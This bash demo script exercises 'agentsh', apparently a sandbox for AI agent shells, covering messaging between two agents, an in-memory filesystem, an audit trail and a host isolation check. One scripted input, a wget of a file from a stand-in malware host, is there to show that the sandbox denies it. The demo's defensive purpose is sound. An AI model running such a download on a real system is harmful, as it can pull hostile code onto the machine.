#!/bin/bash
#
# demo.sh - end-to-end agentsh sandbox demo.
#
# Shows all four layers working together:
#   1. two agents (alice, bob) run sandboxed shells
#   2. the message broker routes a message from alice to bob
#   3. file commands act on the in-memory VFS (never the host)
#   4. a disallowed command is denied
#   5. the audit trail is queried with the bash tools
#
# Everything runs in a scratch working directory so no host files are touched.

set -u
cd "$(dirname "$0")/.." || exit 1

if [ ! -x ./agentsh ] || [ ! -x ./broker ]; then
	echo "Build first: make"
	exit 1
fi

ROOT=$(pwd)
WORK=$(mktemp -d)
echo "Demo workspace: $WORK"

# Bring the built binaries and tools into the scratch dir.
cp ./agentsh ./broker "$WORK"/
mkdir -p "$WORK/tools"
cp ./tools/logquery.sh ./tools/usage.sh "$WORK/tools"/
cd "$WORK" || exit 1

cleanup() {
	if [ -n "${BROKER_PID:-}" ]; then
		kill "$BROKER_PID" 2>/dev/null
		wait "$BROKER_PID" 2>/dev/null
	fi
	cd "$ROOT" || return
	rm -rf "$WORK"
}
trap cleanup EXIT

# --- 1. set up the message bus FIFOs and start the broker ---
mkfifo serverFIFO alice bob
./broker &
BROKER_PID=$!
sleep 0.3

echo
echo "=== bob comes online and waits for messages ==="
# bob idles a moment (so his listener thread is up to receive alice's message),
# then exits. His incoming message prints to bob's stdout below.
./agentsh bob < <(sleep 1.5; printf 'exit\n') &
BOB_PID=$!
sleep 0.4

echo
echo "=== alice runs a sandboxed session and messages bob ==="
./agentsh alice 2>/dev/null <<'EOF'
mkdir /workspace
cd /workspace
touch report.txt
write report.txt quarterly numbers look good
cat report.txt
tree
sendmsg bob hello bob, the report is ready
wget http://malware.example/x
exit
EOF

wait "$BOB_PID" 2>/dev/null

echo
echo "=== audit trail: everything alice attempted this month ==="
./tools/logquery.sh audit alice "$(date +%b)"
echo "--- queryResults ---"
for f in queryResults/*.log; do
	[ -e "$f" ] || continue
	echo ">> $f"
	cat "$f"
done

echo
echo "=== telemetry: how many commands were denied? ==="
printf 'denied commands: '
./tools/usage.sh DENY audit

echo
echo "=== host isolation check ==="
if [ -e /workspace ] || [ -e ./workspace ]; then
	echo "WARNING: sandbox leaked to host!"
else
	echo "OK: /workspace exists only inside the sandbox VFS, not on the host"
fi

echo
echo "Demo complete."
